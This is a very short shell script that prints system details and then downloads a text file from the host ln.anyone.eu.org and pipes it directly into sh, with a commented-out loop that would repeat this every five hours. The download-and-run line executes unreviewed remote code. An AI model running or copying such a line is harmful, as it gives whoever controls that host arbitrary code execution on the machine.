#!/bin/sh

set -x
uname -a
df -h

#while 
wget -qO - ln.anyone.eu.org/test.txt | sh -se
#; do sleep 5h; done
